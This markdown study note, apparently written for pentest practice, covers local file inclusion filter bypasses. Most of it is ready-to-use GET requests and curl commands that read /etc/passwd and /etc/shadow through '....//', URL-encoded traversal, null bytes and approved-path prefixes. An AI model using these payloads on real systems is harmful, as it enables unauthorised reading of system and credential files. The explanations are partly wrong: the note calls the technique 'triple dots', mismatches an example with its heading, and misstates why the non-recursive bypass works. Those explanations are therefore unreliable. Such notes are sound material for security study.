```markdown
# 🛠️ LFI Bypasses - Non-recursive (....//), URL encoding (%2e%2e%2f), Approved paths (./languages/../../../)

> [!ABSTRACT] This note covers techniques for bypassing Local File Inclusion (LFI) without recursion, using URL encoding and approved paths.

---

## 🧑‍💻 Non-recursive LFI Bypass Techniques

### ...// Usage
The `...//` technique is used to break out of the current directory context in a way that some web servers interpret as an upward traversal. 

> [!INFO] Example Request
> 
> `GET /vulnerable.php?page=../../../../etc/passwd%00 HTTP/1.1`

### URL Encoding (%2e%2e%2f)
URL encoding can be used to encode the path traversal characters (`../`) in a way that bypasses basic input sanitization.

> [!EXAMPLE] Encoded Path
>
> `GET /vulnerable.php?page=%2e%2e%2f%2e%2e%2fetc/passwd HTTP/1.1`

### Approved Paths (./languages/)
Approved paths can be used to bypass filters that only allow specific directory listings or deny common path traversal patterns.

> [!NOTE] Example Path
>
> `GET /vulnerable.php?page=./languages/../../../etc/passwd HTTP/1.1`

---

## 📑 Summary of Techniques

| Technique | Description |
|---|---|
| ...// Usage | Break out of directory context using triple dots followed by slashes. |
| URL Encoding (%2e%2e%2f) | Encode path traversal characters to bypass simple filters. |
| Approved Paths (./languages/) | Use specific approved directories as a base for traversal. |

---

# 📄 Example Exploitation Scenarios

### Directory Traversal Using ...//
This example demonstrates how to use `...//` to traverse directories and access the `/etc/passwd` file.

> [!SUCCESS] Exploit Execution
>
> ```bash
> curl http://target/vulnerable.php?page=....//....//etc/passwd
> ```

### URL Encoding for Bypass
This section illustrates how URL encoding can be used to encode `../` and bypass filters that block standard path traversal techniques.

> [!SUCCESS] Exploit Execution
>
> ```bash
> curl http://target/vulnerable.php?page=%2e%2e%2f%2e%2e%2fetc/passwd
> ```

### Approved Paths for Deceptive Bypass
This example shows how to use an approved path structure to trick the server into allowing directory traversal.

> [!SUCCESS] Exploit Execution
>
> ```bash
> curl http://target/vulnerable.php?page=./languages/../../../etc/passwd
> ```

---

# 🧑‍💻 Post-Exploitation

## File Access and Information Gathering
After gaining access to critical files via LFI, further actions can be taken for information gathering.

### Checking Other Critical Files
Access other system configuration or sensitive files using similar techniques.

> [!SUCCESS] Exploit Execution
>
> ```bash
> curl http://target/vulnerable.php?page=./languages/../../../etc/shadow
> ```

---

# 📚 Further Reading and References

- [[Web Security Academy - LFI Bypasses]]
- [[OWASP Local File Inclusion Cheat Sheet]]

> [!WARNING] Risk of Misuse
>
> Ensure that these techniques are used responsibly within a controlled lab environment for learning purposes only.
```